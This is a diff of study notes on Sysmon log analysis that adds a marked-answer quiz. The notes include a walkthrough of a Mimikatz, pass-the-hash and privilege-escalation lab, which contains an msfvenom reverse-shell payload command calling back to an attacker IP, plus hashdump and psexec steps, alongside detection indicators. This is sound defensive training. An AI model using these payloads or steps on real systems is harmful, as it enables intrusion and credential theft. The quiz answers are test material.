@@ -1,4 +1,4 @@
-# Log Analysis with Sysmon — Summary Notes
+# Log Analysis with Sysmon - Summary Notes
 
 ## Table of Contents
 
@@ -22,12 +22,13 @@
    - Metasploit getsystem command
    - Questions & methodology
 5. [Conclusion](#5-conclusion)
+6. [Quiz](#quiz)
 
 ---
 
 ## 1. Introduction & Setup of Sysmon
 
-Keeping log records is one of the most essential activities of information systems — logs make it possible to determine when, how, and from where an attack occurred.
+Keeping log records is one of the most essential activities of information systems - logs make it possible to determine when, how, and from where an attack occurred.
 
 ### What is Sysmon
 **Sysmon (System Monitor)** is a tool developed by Microsoft that records system activity on the machine it is installed on.
@@ -46,8 +47,8 @@ Sysmon.exe -i -accepteula
 
 ### Configuration
 Sysmon installs with a default configuration file, but a custom one can be created. Configuration uses **XML** format and has two main sections:
-- **HashAlgorithms** — specifies which hash algorithms to use
-- **EventFiltering** — specifies which events to monitor or exclude
+- **HashAlgorithms** - specifies which hash algorithms to use
+- **EventFiltering** - specifies which events to monitor or exclude
 
 `include` statements are used to include events, and `exclude` statements are used to exclude them. Each filtering rule uses a **condition** type (e.g., `is`, `contains`, `begin with`) to match against tag values.
 
@@ -88,7 +89,7 @@ Mimikatz relies on `lsass.exe` to capture passwords. Monitoring processes that a
 ### Questions & Methodology
 
 **1. What is the username running Mimikatz on the system? (Without computer name)**
-Found by opening the Sysmon logs, filtering for **Event ID 1**, and searching for "mimikatz" — the first matching event's details showed the username running Mimikatz.
+Found by opening the Sysmon logs, filtering for **Event ID 1**, and searching for "mimikatz" - the first matching event's details showed the username running Mimikatz.
 
 **2. What is the MD5 value of the mimikatz.exe run?**
 Observed directly within the logs, and confirmed independently using PowerShell:
@@ -98,7 +99,7 @@ Get-FileHash
 ```
 
 **3. What is the full directory where Mimikatz.exe is located?**
-Found the same way, from the logs — the **CurrentDirectory** field showed the full directory path.
+Found the same way, from the logs - the **CurrentDirectory** field showed the full directory path.
 
 **4. What is the Process ID of mimikatz.exe run on "10/4/2022 7:09:46 AM"?**
 Also found directly in the log entry matching that timestamp.
@@ -119,7 +120,7 @@ Also found directly in the log entry matching that timestamp.
 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp lhost=192.168.2.120 lport=4343 -b '\x00' -e x86/shikata_ga_nai -f exe -o shell.exe
 ```
 
-2. Wait for the victim to open the file — a Meterpreter session opens once executed.
+2. Wait for the victim to open the file - a Meterpreter session opens once executed.
 
 3. Attempting `hashdump` immediately fails due to insufficient privileges.
 
@@ -141,7 +142,7 @@ migrate
 hashdump
 ```
 
-7. Load the captured hash into Metasploit's **psexec** module to authenticate as the admin user — completing the pass-the-hash attack without ever knowing the actual password.
+7. Load the captured hash into Metasploit's **psexec** module to authenticate as the admin user - completing the pass-the-hash attack without ever knowing the actual password.
 
 ### Detection of the Attack
 
@@ -150,12 +151,12 @@ Because Pass the Hash produces normal-looking network behavior, network traffic 
 **Preliminary check:** In Local Group Policy Editor, confirm that **Success** and **Failure** auditing are enabled under "Audit account logon events."
 
 **Indicators to look for when reviewing logon events:**
-- **Event ID 4624** — successful logon events
-- **Logon Type 3** — network logon (connection from elsewhere on the network)
-- **Security ID** — typically shows as **NULL SID** in pass-the-hash attacks
-- **Logon Process** — `NtLmSsp`
-- **Key Length** — `0` (a normal RDP connection would show a 128-bit key length)
-- **Workstation Name** — often a random/nonsensical string, another red flag
+- **Event ID 4624** - successful logon events
+- **Logon Type 3** - network logon (connection from elsewhere on the network)
+- **Security ID** - typically shows as **NULL SID** in pass-the-hash attacks
+- **Logon Process** - `NtLmSsp`
+- **Key Length** - `0` (a normal RDP connection would show a 128-bit key length)
+- **Workstation Name** - often a random/nonsensical string, another red flag
 
 In the analyzed case, all of these indicators were present, confirming that the attacker (IP `192.168.2.120`) had infiltrated the system as the `admin` user via pass-the-hash.
 
@@ -176,7 +177,7 @@ Granting users unnecessary service permissions (start/stop/reconfigure) creates 
 accesschk
 ```
 
-This reveals that **everyone** has permission to modify the service. Ali then changes the service's executable path to point to his own malware and starts the service — which runs with **system privileges**, executing the malware as SYSTEM.
+This reveals that **everyone** has permission to modify the service. Ali then changes the service's executable path to point to his own malware and starts the service - which runs with **system privileges**, executing the malware as SYSTEM.
 
 **Log Records:**
 - **Event ID 13** (Registry value set) shows the service's executable path being changed.
@@ -216,4 +217,68 @@ Navigated through the events surrounding the question above and noticed that the
 
 ## 5. Conclusion
 
-This material covered how to analyze system activity using Sysmon, and how to detect and investigate several common Windows attack techniques — Mimikatz credential dumping, Pass the Hash, and multiple privilege escalation methods (weak service permissions, insecure registry permissions, and Metasploit's `getsystem`). Across all cases, correlating specific Sysmon Event IDs (1, 3, 13) with Windows Security event logs (e.g., 4624) proved central to reconstructing attacker activity step by step.
+This material covered how to analyze system activity using Sysmon, and how to detect and investigate several common Windows attack techniques - Mimikatz credential dumping, Pass the Hash, and multiple privilege escalation methods (weak service permissions, insecure registry permissions, and Metasploit's `getsystem`). Across all cases, correlating specific Sysmon Event IDs (1, 3, 13) with Windows Security event logs (e.g., 4624) proved central to reconstructing attacker activity step by step.
+
+**QUIZ**
+
+1. What is Sysmon abbreviation?
+- System Monitor (correct)
+- System Monitoring
+- Operating System Monitor
+- OS Monitor
+
+2. In which directory is the Sysmon logs located in Event Viewer?
+- Applications and Services Logs/Microsoft/Sysmon
+- Applications and Services Logs/Microsoft/Windows/Sysmon (correct)
+- Not found
+- Security
+
+3. Which log does ID number 1 represent in Sysmon?
+- Image File Changed
+- Process Create (correct)
+- Driver Loaded
+- FileStream Created
+
+4. What does the Mimikatz tool do?
+- Obtains passwords from memory (correct)
+- It is a tool that performs a brute force attack.
+- Copies browser history
+- It is antivirus software
+
+5. Which method cannot be used to detect mimikatz usage with Sysmon?
+- Hash tracking of files
+- Checking the names of processes
+- Monitoring lsass.exe
+- Following the download folder (correct)
+
+6. What is Privilege Escalation?
+- Accessing high-level rights by using errors or misconfigurations on the system. (correct)
+- Obtaining password information by performing a brute force attack on the obtained NTLM hashes.
+- Infiltrating the system by obtaining the Administrator password using social engineering methods
+- It is the application of various attack vectors and the system becoming inoperable.
+
+7. Which one is one of the methods to be used for Privilege Escalation?
+- DDoS
+- Using weak service permissions (correct)
+- Ransomware
+- Brute force
+
+8. For which operating system was Sysmon first created?
+- Linux
+- Android
+- Windows (correct)
+- MacOS
+
+9. Which of the following cannot be detected with Sysmon logs?
+- The attacker's development process before infiltrating the system (correct)
+- Trying Privilege escalation techniques
+- Installing malware on the system
+- Getting the memory dump
+
+10. Which log is not found in Sysmon?
+- Created processes
+- Registry change details
+- RDP Brute Force details (correct)
+- File writing activities
+
+![course_badge](images/sysmoner.png)
